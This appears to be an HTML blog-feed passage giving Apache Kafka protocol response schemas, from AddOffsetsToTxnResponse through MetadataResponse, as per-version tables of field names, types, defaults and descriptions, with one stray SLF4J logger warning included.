    <content type="html"><![CDATA[<h2 id="AddOffsetsToTxnResponse"><a href="#AddOffsetsToTxnResponse" class="headerlink" title="AddOffsetsToTxnResponse"></a>AddOffsetsToTxnResponse</h2><h3 id="version-0"><a href="#version-0" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h2 id="AddPartitionsToTxnResponse"><a href="#AddPartitionsToTxnResponse" class="headerlink" title="AddPartitionsToTxnResponse"></a>AddPartitionsToTxnResponse</h2><h3 id="version-0-1"><a href="#version-0-1" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>errors</td><td>ARRAY({topic:STRING,partition_errors:ARRAY({partition:INT32,error_code:INT16})})</td><td>null</td><td>null</td></tr></table>  <h2 id="AlterConfigsResponse"><a href="#AlterConfigsResponse" class="headerlink" title="AlterConfigsResponse"></a>AlterConfigsResponse</h2><h3 id="version-0-2"><a href="#version-0-2" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>resources</td><td>ARRAY({error_code:INT16,error_message:NULLABLE_STRING,resource_type:INT8,resource_name:STRING})</td><td>null</td><td>null</td></tr></table>  <h2 id="AlterReplicaLogDirsResponse"><a href="#AlterReplicaLogDirsResponse" class="headerlink" title="AlterReplicaLogDirsResponse"></a>AlterReplicaLogDirsResponse</h2><h3 id="version-0-3"><a href="#version-0-3" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,error_code:INT16})})</td><td>null</td><td>null</td></tr></table>  <h2 id="ApiVersionsResponse"><a href="#ApiVersionsResponse" class="headerlink" title="ApiVersionsResponse"></a>ApiVersionsResponse</h2><h3 id="version-0-4"><a href="#version-0-4" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>api_versions</td><td>ARRAY({api_key:INT16,min_version:INT16,max_version:INT16})</td><td>null</td><td>API versions supported by the broker.</td></tr></table>  <h3 id="version-1"><a href="#version-1" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>api_versions</td><td>ARRAY({api_key:INT16,min_version:INT16,max_version:INT16})</td><td>null</td><td>API versions supported by the broker.</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr></table>  <h2 id="ControlledShutdownResponse"><a href="#ControlledShutdownResponse" class="headerlink" title="ControlledShutdownResponse"></a>ControlledShutdownResponse</h2><h3 id="version-0-5"><a href="#version-0-5" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>partitions_remaining</td><td>ARRAY({topic:STRING,partition:INT32})</td><td>null</td><td>The partitions that the broker still leads.</td></tr></table>  <h3 id="version-1-1"><a href="#version-1-1" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>partitions_remaining</td><td>ARRAY({topic:STRING,partition:INT32})</td><td>null</td><td>The partitions that the broker still leads.</td></tr></table>  <h2 id="CreateAclsResponse"><a href="#CreateAclsResponse" class="headerlink" title="CreateAclsResponse"></a>CreateAclsResponse</h2><h3 id="version-0-6"><a href="#version-0-6" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>creation_responses</td><td>ARRAY({error_code:INT16,error_message:NULLABLE_STRING})</td><td>null</td><td>null</td></tr></table>  <h2 id="CreatePartitionsResponse"><a href="#CreatePartitionsResponse" class="headerlink" title="CreatePartitionsResponse"></a>CreatePartitionsResponse</h2><h3 id="version-0-7"><a href="#version-0-7" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>topic_errors</td><td>ARRAY({topic:STRING,error_code:INT16,error_message:NULLABLE_STRING})</td><td>null</td><td>Per topic results for the create partitions request</td></tr></table>  <h2 id="CreateTopicsResponse"><a href="#CreateTopicsResponse" class="headerlink" title="CreateTopicsResponse"></a>CreateTopicsResponse</h2><h3 id="version-0-8"><a href="#version-0-8" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topic_errors</td><td>ARRAY({topic:STRING,error_code:INT16})</td><td>null</td><td>An array of per topic error codes.</td></tr></table>  <h3 id="version-1-2"><a href="#version-1-2" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topic_errors</td><td>ARRAY({topic:STRING,error_code:INT16,error_message:NULLABLE_STRING})</td><td>null</td><td>An array of per topic errors.</td></tr></table>  <h3 id="version-2"><a href="#version-2" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>topic_errors</td><td>ARRAY({topic:STRING,error_code:INT16,error_message:NULLABLE_STRING})</td><td>null</td><td>An array of per topic errors.</td></tr></table>  <h2 id="DeleteAclsResponse"><a href="#DeleteAclsResponse" class="headerlink" title="DeleteAclsResponse"></a>DeleteAclsResponse</h2><p>SLF4J: Failed to load class “org.slf4j.impl.StaticLoggerBinder”.<br>SLF4J: Defaulting to no-operation (NOP) logger implementation<br>SLF4J: See <a href="http://www.slf4j.org/codes.html#StaticLoggerBinder" target="_blank" rel="noopener">http://www.slf4j.org/codes.html#StaticLoggerBinder</a> for further details.</p><h3 id="version-0-9"><a href="#version-0-9" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>filter_responses</td><td>ARRAY({error_code:INT16,error_message:NULLABLE_STRING,matching_acls:ARRAY({error_code:INT16,error_message:NULLABLE_STRING,resource_type:INT8,resource_name:STRING,principal:STRING,host:STRING,operation:INT8,permission_type:INT8})})</td><td>null</td><td>null</td></tr></table>  <h2 id="DeleteRecordsResponse"><a href="#DeleteRecordsResponse" class="headerlink" title="DeleteRecordsResponse"></a>DeleteRecordsResponse</h2><h3 id="version-0-10"><a href="#version-0-10" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,low_watermark:INT64,error_code:INT16})})</td><td>null</td><td>null</td></tr></table>  <h2 id="DeleteTopicsResponse"><a href="#DeleteTopicsResponse" class="headerlink" title="DeleteTopicsResponse"></a>DeleteTopicsResponse</h2><h3 id="version-0-11"><a href="#version-0-11" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topic_error_codes</td><td>ARRAY({topic:STRING,error_code:INT16})</td><td>null</td><td>An array of per topic error codes.</td></tr></table>  <h3 id="version-1-3"><a href="#version-1-3" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>topic_error_codes</td><td>ARRAY({topic:STRING,error_code:INT16})</td><td>null</td><td>An array of per topic error codes.</td></tr></table>  <h2 id="DescribeAclsResponse"><a href="#DescribeAclsResponse" class="headerlink" title="DescribeAclsResponse"></a>DescribeAclsResponse</h2><h3 id="version-0-12"><a href="#version-0-12" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>error_message</td><td>NULLABLE_STRING</td><td>null</td><td>Response error message</td></tr><tr><td>resources</td><td>ARRAY({resource_type:INT8,resource_name:STRING,acls:ARRAY({principal:STRING,host:STRING,operation:INT8,permission_type:INT8})})</td><td>null</td><td>The resources and their associated ACLs.</td></tr></table>  <h2 id="DescribeConfigsResponse"><a href="#DescribeConfigsResponse" class="headerlink" title="DescribeConfigsResponse"></a>DescribeConfigsResponse</h2><h3 id="version-0-13"><a href="#version-0-13" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>resources</td><td>ARRAY({error_code:INT16,error_message:NULLABLE_STRING,resource_type:INT8,resource_name:STRING,config_entries:ARRAY({config_name:STRING,config_value:NULLABLE_STRING,read_only:BOOLEAN,is_default:BOOLEAN,is_sensitive:BOOLEAN})})</td><td>null</td><td>null</td></tr></table>  <h2 id="DescribeGroupsResponse"><a href="#DescribeGroupsResponse" class="headerlink" title="DescribeGroupsResponse"></a>DescribeGroupsResponse</h2><h3 id="version-0-14"><a href="#version-0-14" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>groups</td><td>ARRAY({error_code:INT16,group_id:STRING,state:STRING,protocol_type:STRING,protocol:STRING,members:ARRAY({member_id:STRING,client_id:STRING,client_host:STRING,member_metadata:BYTES,member_assignment:BYTES})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-4"><a href="#version-1-4" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>groups</td><td>ARRAY({error_code:INT16,group_id:STRING,state:STRING,protocol_type:STRING,protocol:STRING,members:ARRAY({member_id:STRING,client_id:STRING,client_host:STRING,member_metadata:BYTES,member_assignment:BYTES})})</td><td>null</td><td>null</td></tr></table>  <h2 id="DescribeLogDirsResponse"><a href="#DescribeLogDirsResponse" class="headerlink" title="DescribeLogDirsResponse"></a>DescribeLogDirsResponse</h2><h3 id="version-0-15"><a href="#version-0-15" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>log_dirs</td><td>ARRAY({error_code:INT16,log_dir:STRING,topics:ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,size:INT64,offset_lag:INT64,is_future:BOOLEAN})})})</td><td>null</td><td>null</td></tr></table>  <h2 id="EndTxnResponse"><a href="#EndTxnResponse" class="headerlink" title="EndTxnResponse"></a>EndTxnResponse</h2><h3 id="version-0-16"><a href="#version-0-16" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h2 id="FetchResponse"><a href="#FetchResponse" class="headerlink" title="FetchResponse"></a>FetchResponse</h2><h3 id="version-0-17"><a href="#version-0-17" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition_header:{partition:INT32,error_code:INT16,high_watermark:INT64},record_set:RECORDS})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-5"><a href="#version-1-5" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition_header:{partition:INT32,error_code:INT16,high_watermark:INT64},record_set:RECORDS})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-2-1"><a href="#version-2-1" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition_header:{partition:INT32,error_code:INT16,high_watermark:INT64},record_set:RECORDS})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-3"><a href="#version-3" class="headerlink" title="version:3"></a>version:3</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition_header:{partition:INT32,error_code:INT16,high_watermark:INT64},record_set:RECORDS})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-4"><a href="#version-4" class="headerlink" title="version:4"></a>version:4</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition_header:{partition:INT32,error_code:INT16,high_watermark:INT64,last_stable_offset:INT64,aborted_transactions:ARRAY({producer_id:INT64,first_offset:INT64})},record_set:RECORDS})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-5"><a href="#version-5" class="headerlink" title="version:5"></a>version:5</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition_header:{partition:INT32,error_code:INT16,high_watermark:INT64,last_stable_offset:INT64,log_start_offset:INT64,aborted_transactions:ARRAY({producer_id:INT64,first_offset:INT64})},record_set:RECORDS})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-6"><a href="#version-6" class="headerlink" title="version:6"></a>version:6</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition_header:{partition:INT32,error_code:INT16,high_watermark:INT64,last_stable_offset:INT64,log_start_offset:INT64,aborted_transactions:ARRAY({producer_id:INT64,first_offset:INT64})},record_set:RECORDS})})</td><td>null</td><td>null</td></tr></table>  <h2 id="FindCoordinatorResponse"><a href="#FindCoordinatorResponse" class="headerlink" title="FindCoordinatorResponse"></a>FindCoordinatorResponse</h2><h3 id="version-0-18"><a href="#version-0-18" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>coordinator</td><td>{node_id:INT32,host:STRING,port:INT32}</td><td>null</td><td>Host and port information for the coordinator for a consumer group.</td></tr></table>  <h3 id="version-1-6"><a href="#version-1-6" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>error_message</td><td>NULLABLE_STRING</td><td>null</td><td>Response error message</td></tr><tr><td>coordinator</td><td>{node_id:INT32,host:STRING,port:INT32}</td><td>null</td><td>Host and port information for the coordinator</td></tr></table>  <h2 id="HeartbeatResponse"><a href="#HeartbeatResponse" class="headerlink" title="HeartbeatResponse"></a>HeartbeatResponse</h2><h3 id="version-0-19"><a href="#version-0-19" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h3 id="version-1-7"><a href="#version-1-7" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h2 id="InitProducerIdResponse"><a href="#InitProducerIdResponse" class="headerlink" title="InitProducerIdResponse"></a>InitProducerIdResponse</h2><h3 id="version-0-20"><a href="#version-0-20" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>producer_id</td><td>INT64</td><td>null</td><td>Current producer id in use by the transactional id.</td></tr><tr><td>producer_epoch</td><td>INT16</td><td>null</td><td>Current epoch associated with the producer id.</td></tr></table>  <h2 id="JoinGroupResponse"><a href="#JoinGroupResponse" class="headerlink" title="JoinGroupResponse"></a>JoinGroupResponse</h2><h3 id="version-0-21"><a href="#version-0-21" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>generation_id</td><td>INT32</td><td>null</td><td>The generation of the group.</td></tr><tr><td>group_protocol</td><td>STRING</td><td>null</td><td>The group protocol selected by the coordinator</td></tr><tr><td>leader_id</td><td>STRING</td><td>null</td><td>The leader of the group</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr><tr><td>members</td><td>ARRAY({member_id:STRING,member_metadata:BYTES})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-8"><a href="#version-1-8" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>generation_id</td><td>INT32</td><td>null</td><td>The generation of the group.</td></tr><tr><td>group_protocol</td><td>STRING</td><td>null</td><td>The group protocol selected by the coordinator</td></tr><tr><td>leader_id</td><td>STRING</td><td>null</td><td>The leader of the group</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr><tr><td>members</td><td>ARRAY({member_id:STRING,member_metadata:BYTES})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-2-2"><a href="#version-2-2" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>generation_id</td><td>INT32</td><td>null</td><td>The generation of the group.</td></tr><tr><td>group_protocol</td><td>STRING</td><td>null</td><td>The group protocol selected by the coordinator</td></tr><tr><td>leader_id</td><td>STRING</td><td>null</td><td>The leader of the group</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr><tr><td>members</td><td>ARRAY({member_id:STRING,member_metadata:BYTES})</td><td>null</td><td>null</td></tr></table>  <h2 id="LeaderAndIsrResponse"><a href="#LeaderAndIsrResponse" class="headerlink" title="LeaderAndIsrResponse"></a>LeaderAndIsrResponse</h2><h3 id="version-0-22"><a href="#version-0-22" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>partitions</td><td>ARRAY({topic:STRING,partition:INT32,error_code:INT16})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-9"><a href="#version-1-9" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>partitions</td><td>ARRAY({topic:STRING,partition:INT32,error_code:INT16})</td><td>null</td><td>null</td></tr></table>  <h2 id="LeaveGroupResponse"><a href="#LeaveGroupResponse" class="headerlink" title="LeaveGroupResponse"></a>LeaveGroupResponse</h2><h3 id="version-0-23"><a href="#version-0-23" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h3 id="version-1-10"><a href="#version-1-10" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr></table>  <h2 id="ListGroupsResponse"><a href="#ListGroupsResponse" class="headerlink" title="ListGroupsResponse"></a>ListGroupsResponse</h2><h3 id="version-0-24"><a href="#version-0-24" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>groups</td><td>ARRAY({group_id:STRING,protocol_type:STRING})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-11"><a href="#version-1-11" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>error_code</td><td>INT16</td><td>null</td><td>Response error code</td></tr><tr><td>groups</td><td>ARRAY({group_id:STRING,protocol_type:STRING})</td><td>null</td><td>null</td></tr></table>  <h2 id="ListOffsetResponse"><a href="#ListOffsetResponse" class="headerlink" title="ListOffsetResponse"></a>ListOffsetResponse</h2><h3 id="version-0-25"><a href="#version-0-25" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16,offsets:ARRAY(INT64)})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-12"><a href="#version-1-12" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16,timestamp:INT64,offset:INT64})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-2-3"><a href="#version-2-3" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>throttle_time_ms</td><td>INT32</td><td>0</td><td>Duration in milliseconds for which the request was throttled due to quota violation (Zero if the request did not violate any quota)</td></tr><tr><td>responses</td><td>ARRAY({topic:STRING,partition_responses:ARRAY({partition:INT32,error_code:INT16,timestamp:INT64,offset:INT64})})</td><td>null</td><td>null</td></tr></table>  <h2 id="MetadataResponse"><a href="#MetadataResponse" class="headerlink" title="MetadataResponse"></a>MetadataResponse</h2><h3 id="version-0-26"><a href="#version-0-26" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>brokers</td><td>ARRAY({node_id:INT32,host:STRING,port:INT32})</td><td>null</td><td>Host and port information for all brokers.</td></tr><tr><td>topic_metadata</td><td>ARRAY({error_code:INT16,topic:STRING,partition_metadata:ARRAY({error_code:INT16,partition:INT32,leader:INT32,replicas:ARRAY(INT32),isr:ARRAY(INT32)})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-13"><a href="#version-1-13" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>brokers</td><td>ARRAY({node_id:INT32,host:STRING,port:INT32,rack:NULLABLE_STRING})</td><td>null</td><td>Host and port information for all brokers.</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>The broker id of the controller broker.</td></tr><tr><td>topic_metadata</td><td>ARRAY({error_code:INT16,topic:STRING,is_internal:BOOLEAN,partition_metadata:ARRAY({error_code:INT16,partition:INT32,leader:INT32,replicas:ARRAY(INT32),isr:ARRAY(INT32)})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-2-4"><a href="#version-2-4" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>brokers</td><td>ARRAY({node_id:INT32,host:STRING,port:INT32,rack:NULLABLE_STRING})</td><td>null</td><td>Host and port information for all brokers.</td></tr><tr><td>cluster_id</td><td>NULLABLE_STRING</td><td>null</td><td>The cluster id that this broker belongs to.</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>The broker id of the controller broker.</td></tr><tr><td>topic_metadata</td><td>ARRAY({error_code:INT16,topic:STRING,is_internal:BOOLEAN,partition_metadata:ARRAY({error_code:INT16,partition:INT32,leader:INT32,replicas:ARRAY(INT32),isr:ARRAY(INT32)})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-3-1"><a href="#version-3-1" class="headerlink" title="version:3"></a>version:3</h3><table><tr><td 